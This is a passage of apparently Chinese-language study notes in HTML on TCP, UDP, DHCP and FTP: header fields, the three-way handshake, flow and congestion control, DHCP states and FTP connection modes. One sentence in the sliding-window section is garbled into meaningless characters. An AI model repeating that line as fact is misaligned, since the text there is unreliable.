title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li> 与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li> 目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li> MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li> 连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul><h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#掌握FTP的工作原理</span><span class="token comment">#掌握FTP常用命令的使用方法及用途</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP相应.png" style="zoom:67%;" /><h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a 